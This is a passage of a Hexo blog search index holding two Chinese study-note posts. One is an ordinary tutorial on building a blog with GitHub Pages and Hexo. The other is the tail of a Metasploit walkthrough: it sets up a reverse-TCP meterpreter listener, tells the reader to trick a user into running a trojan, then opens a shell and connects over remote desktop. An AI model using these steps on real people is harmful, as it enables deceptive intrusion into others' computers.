class="line">exploit/multi/handler</span><br></pre></td></tr></table></figure></li><li><p>加载payload（要和生成木马选用的payload一致）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">set payload windows/meterpreter/reverse_tcp</span><br></pre></td></tr></table></figure></li><li><p>查看哪些参数是需要输入的</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">show opptions</span><br><span class="line">#设置监听的IP</span><br><span class="line">set lhost 192.168.10.14</span><br><span class="line">#设置监听的端口</span><br><span class="line">set lport 8787</span><br></pre></td></tr></table></figure></li><li><p>运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">run/exploit</span><br></pre></td></tr></table></figure></li></ol><h2 id="六、进行欺骗"><a href="#六、进行欺骗" class="headerlink" title="六、进行欺骗"></a>六、进行欺骗</h2><ol><li>诱导用户点击我们的木马程序</li><li>等待用户上线，就能得到meterpreter</li></ol><h2 id="七、获得shell"><a href="#七、获得shell" class="headerlink" title="七、获得shell"></a>七、获得shell</h2><ol><li><p>执行shell 进到被攻击者电脑的终端</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">shell</span><br></pre></td></tr></table></figure></li><li><p>添加添加用户  开机3389 连接桌面(</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.10.19</span><br></pre></td></tr></table></figure></li></ol>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Metasploit </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>利用GitHub Pages搭建个人博客</title>
      <link href="/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/"/>
      <url>/2019/03/13/%E5%88%A9%E7%94%A8github%20pages+hexo%20%E6%90%AD%E5%BB%BA%E4%B8%AA%E4%BA%BA%E5%8D%9A%E5%AE%A2/</url>
      
        <content type="html"><![CDATA[<h2 id="一、创建GitHub-Pages"><a href="#一、创建GitHub-Pages" class="headerlink" title="一、创建GitHub Pages"></a>一、创建GitHub Pages</h2><p>使用GitHub Pages搭建博客的好处有：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">1. 全是静态文件，访问速度快；</span><br><span class="line">2. 免费方便，不用花一分钱就可以搭建一个自由的个人博客，不需要服务器不需要后台；</span><br><span class="line">3. 可以随意绑定自己的域名，不仔细看的话根本看不出来你的网站是基于github的；</span><br><span class="line">4. 数据绝对安全，基于github的版本管理，想恢复到哪个历史版本都行；</span><br><span class="line">5. 博客内容可以轻松打包、转移、发布到其它平台；</span><br><span class="line">6. 等等；</span><br></pre></td></tr></table></figure><a id="more"></a><h3 id="1-首先创建存储库"><a href="#1-首先创建存储库" class="headerlink" title="1. 首先创建存储库"></a>1. 首先创建存储库</h3><p>前往<a href="https://github.com/" target="_blank" rel="noopener">GitHub</a>并<a href="https://github.com/new" target="_blank" rel="noopener">创建一个</a>名为<em>username</em> .github.io <a href="https://github.com/new" target="_blank" rel="noopener">的新存储库</a>，其中<em>username</em>是GitHub上的用户名（或组织名称）</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/1552609247373.png" alt="1552609247373"></p><p><strong>注意：如果存储库名字的第一部分与你的用户名不完全匹配，则无法正常工作，因此请务必正确使用。</strong></p><h3 id="2-安装-Git"><a href="#2-安装-Git" class="headerlink" title="2. 安装 Git"></a>2. 安装 Git</h3><ul><li>Windows：下载并安装 <a href="https://git-scm.com/download/win" target="_blank" rel="noopener">git</a>.</li><li>Mac：使用 <a href="http://mxcl.github.com/homebrew/" target="_blank" rel="noopener">Homebrew</a>, <a href="http://www.macports.org/" target="_blank" rel="noopener">MacPorts</a> ：<code>brew install git</code>;或下载 <a href="http://sourceforge.net/projects/git-osx-installer/" target="_blank" rel="noopener">安装程序</a> 安装。</li><li>Linux (Ubuntu, Debian)：<code>sudo apt-get install git-core</code></li><li>Linux (Fedora, Red Hat, CentOS)：<code>sudo yum install git-core</code> </li></ul><h3 id="3-配置SSH连接GitHub"><a href="#3-配置SSH连接GitHub" class="headerlink" title="3. 配置SSH连接GitHub"></a>3. 配置SSH连接GitHub</h3><ol><li><p>配置SSH Key</p><ul><li><p>检查本机是否有ssh key设置</p><p>右键打开git bash</p></li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cd ~/.ssh</span><br></pre></td></tr></table></figure><ul><li>如果没有则提示： No such file or directory，则需要生成ssh密钥</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh-keygen -t rsa -C &quot;github注册邮箱&quot;</span><br></pre></td></tr></table></figure><ul><li><p>然后连续3次回车，最终会生成一个.ssh文件 复制.ssh/id_rsa.pub里内容<br>路径为：C:\Users\Administrator/.ssh (Administrator为你当前登录电脑使用的用户名)</p></li><li><p>打开github - 右上角头像 -Setting - SSH and GPG keys - New SSH key<br>title随便填写，Key内容为.ssh/id_rsa.pub的内容</p><p><img src="/2019/03/13/利用github pages+hexo 搭建个人博客/14398360-5516f5c5666265cd.png" alt="利用github pages+hexo 搭建个人博客"></p></li></ul></li><li><p>配置账户</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git config --global user.name “your_username”  #设置用户名</span><br><span class="line">git config --global user.email “your_registered_github_Email”  </span><br><span class="line">#设置邮箱地址(建议用注册giuhub的邮箱)</span><br></pre></td></tr></table></figure></li></ol><ol start="3"><li><p>测试是否配置成功</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -T git@github.com       # 邮箱地址不需要改。</span><br></pre></td></tr></table></figure><p>直接回车，最后看到这个就说明大功告成：</p><p><em>Hi username! You’ve successfully authenticated, but GitHub does not provide shell access.</em></p></li></ol><h3 id="4-克隆到本地存储库"><a href="#4-克隆到本地存储库" class="headerlink" title="4. 克隆到本地存储库"></a>4. 克隆到本地存储库</h3><p>转到要存储项目的文件夹，然后克隆新存储库：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/用户名/用户名.github.io</span><br></pre></td></tr></table></figure><h3 id="5-创建内容"><a href="#5-创建内容" class="headerlink" title="5. 创建内容"></a>5. 创建内容</h3><p>转入项目文件夹并添加index.html文件：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">cd username.github.io</span><br><span class="line">echo“Hello World”&gt;index.html</span><br></pre></td></tr></table></figure><h3 id="6-推送到GitHub"><a href="#6-推送到GitHub" class="headerlink" title="6. 推送到GitHub"></a>6. 推送到GitHub</h3><p>添加，提交和推送你的更改</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">git add --all</span><br><span class="line">git commit -m“初始提交”</span><br><span class="line">git push -u origin master</span><br></pre></td></tr></table></figure><h3 id="7-浏览你的Github-Pages"><a href="#7-浏览你的Github-Pages" class="headerlink" title="7.浏览你的Github Pages"></a>7.浏览你的Github Pages</h3><p>Well done，启动浏览器并转到<a href="https://username.github.io。" target="_blank" rel="noopener">https://username.github.io。</a></p><h2 id="二、使用Hexo博客框架"><a href="#二、使用Hexo博客框架" class="headerlink" title="二、使用Hexo博客框架"></a>二、使用Hexo博客框架</h2><p>Hexo 是一个快速、简洁且高效的博客框架。Hexo 使用 <a href="http://daringfireball.net/projects/markdown/" target="_blank" rel="noopener">Markdown</a>（或其他渲染引擎）解析文章，在几秒内，即可利用靓丽的主题生成静态网页。</p><h3 id="1-安装前提"><a href="#1-安装前提" class="headerlink" title="1. 安装前提"></a>1. 安装前提</h3><ol><li>安装 Hexo 相当简单。然而在安装前，需确保已安装下列应用程序：</li></ol><ul><li><p><a href="http://nodejs.org/" target="_blank" rel="noopener">Node.js</a></p></li><li><p><a href="http://git-scm.com/" target="_blank" rel="noopener">Git</a></p></li></ul><ol start="2"><li><p>安装 Git，并开启ssh连接</p><p>上文已介绍安装和连接步骤</p></li></ol><ol start="3"><li>安装 Node.js</li></ol><p>安装 Node.js 的最佳方式是使用 <a href="https://github.com/creationix/nvm" target="_blank" rel="noopener">nvm</a>。</p><p>cURL:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ curl https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>Wget:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ wget -qO- https://raw.github.com/creationix/nvm/v0.33.11/install.sh | sh</span><br></pre></td></tr></table></figure><p>安装完成后，重启终端并执行下列命令即可安装 Node.js。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ nvm install stable</span><br></pre></td></tr></table></figure><p>或者您也可以下载 <a href="http://nodejs.org/" target="_blank" rel="noopener">安装程序</a> 来安装。</p><blockquote><p>Windows 用户</p><p>对于windows用户来说，建议使用安装程序进行安装。安装时，请勾选<strong>Add to PATH</strong>选项。<br>另外，您也可以使用<strong>Git Bash</strong>，这是git for windows自带的一组程序，提供了Linux风格的shell，在该环境下，您可以直接用上面提到的命令来安装Node.js。打开它的方法很简单，在任意位置单击右键，选择“Git Bash Here”即可。由于Hexo的很多操作都涉及到命令行，您可以考虑始终使用<strong>Git Bash</strong>来进行操作。</p></blockquote><h3 id="2-快速部署Hexo"><a href="#2-快速部署Hexo" class="headerlink" title="2. 快速部署Hexo"></a>2. 快速部署Hexo</h3><p>所有必备的应用程序安装完成后，即可使用 npm 安装 Hexo。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-cli -g</span><br></pre></td></tr></table></figure><p>安装 Hexo 完成后，请执行下列命令，Hexo 将会在指定文件夹中新建所需要的文件。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">hexo init &lt;folder&gt;</span><br><span class="line">cd &lt;folder&gt;</span><br><span class="line">npm install</span><br></pre></td></tr></table></figure><p>新建完成后，指定文件夹的目录如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── _config.yml</span><br><span class="line">├── package.json</span><br><span class="line">├── scaffolds</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts</span><br><span class="line">|   └── _posts</span><br><span class="line">└── themes</span><br></pre></td></tr></table></figure><p><strong>_config.yml</strong></p><p>网站的配置信息，您可以在此配置大部分的参数。</p><p><strong>package.json</strong></p><p>应用程序信息，新添加的插件内容也会出现在这里面。</p><p><strong>scaffolds</strong></p><p>模版文件夹。当您新建文章时，Hexo 会根据 scaffold 来建立文件。</p><p>这里放了三个模板文件，分别是新添加博客文章（posts）、新添加博客页（page）和新添加草稿（draft）的目标样式。</p><p><strong>source</strong></p><p>资源文件夹是存放博客内容的地方。除 <code>_posts</code> 文件夹之外，开头命名为 <code>_</code> (下划线)的文件 / 文件夹和隐藏的文件将会被忽略。之后我们通过命令新建tags（标签）还有categories（分类）页后，这里会相应地增加文件夹。</p><p><strong>themes</strong></p><p>主题文件夹。Hexo 会根据主题来生成静态页面。</p><h3 id="3-Hexo命令"><a href="#3-Hexo命令" class="headerlink" title="3. Hexo命令"></a>3. Hexo命令</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">hexo g(generate)#生成静态页面</span><br><span class="line">hexo s(server)#启动服务器，默认4000端口，在本地查看内容</span><br></pre></td></tr></table></figure><h3 id="4-部署到github"><a href="#4-部署到github" class="headerlink" title="4. 部署到github"></a>4. 部署到github</h3><p>修改git/blog/_config.yml配置，找到Deployment部分：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">deploy:</span><br><span class="line">  type: git</span><br><span class="line">  repo: &lt;repository url&gt; #https://bitbucket.org/JohnSmith/johnsmith.bitbucket.io</span><br><span class="line">  branch: [branch] #published</span><br><span class="line">  message: [message]</span><br></pre></td></tr></table></figure><p>安装 hexo-deployer-git</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-deployer-git --save   #第一次部署需要先安装插件</span><br></pre></td></tr></table></figure><p><strong>部署</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hexo d(deploy) #部署到网站</span><br></pre></td></tr></table></figure><p>接下来可以访问我们的GitHub pages页面，查看效果啦</p><h3 id="5-最后"><a href="#5-最后" class="headerlink" title="5. 最后"></a>5. 最后</h3><p>关于hexo的最新详细配置，可以参考[hexo官方文档]:<a href="https://hexo.io/zh-cn/docs/" target="_blank" rel="noopener">https://hexo.io/zh-cn/docs/</a></p>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> github </tag>
            
            <tag> 博客 </tag>
            
            <tag> hexo </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
